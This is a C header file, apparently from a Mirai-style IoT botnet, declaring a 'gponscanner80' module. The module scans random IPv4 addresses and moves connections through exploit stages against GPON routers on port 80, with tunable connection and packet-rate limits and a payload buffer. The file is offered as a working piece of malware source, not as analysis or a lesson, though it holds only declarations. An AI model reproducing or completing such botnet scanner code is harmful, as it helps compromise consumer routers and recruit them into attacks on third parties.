#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef SCAN_MAX
#define gponscanner80_SCANNER_MAX_CONNS 512
#define gponscanner80_SCANNER_RAW_PPS 720
#else
#define gponscanner80_SCANNER_MAX_CONNS 128
#define gponscanner80_SCANNER_RAW_PPS 160
#endif

#ifdef SCAN_MAX
#define gponscanner80_SCANNER_RDBUF_SIZE 1024
#define gponscanner80_SCANNER_HACK_DRAIN 64
#else
#define gponscanner80_SCANNER_RDBUF_SIZE 256
#define gponscanner80_SCANNER_HACK_DRAIN 64
#endif

struct gponscanner80_scanner_connection
{
    int fd, last_recv;
    enum
    {
        gponscanner80_SC_CLOSED,
        gponscanner80_SC_CONNECTING,
        gponscanner80_SC_EXPLOIT_STAGE2,
        gponscanner80_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[gponscanner80_SCANNER_RDBUF_SIZE];
    char payload_buf[1024];
};

void gponscanner80_scanner_init();
void gponscanner80_scanner_kill(void);

static void gponscanner80_setup_connection(struct gponscanner80_scanner_connection *);
static ipv4_t gponscanner80_get_random_ip(void);
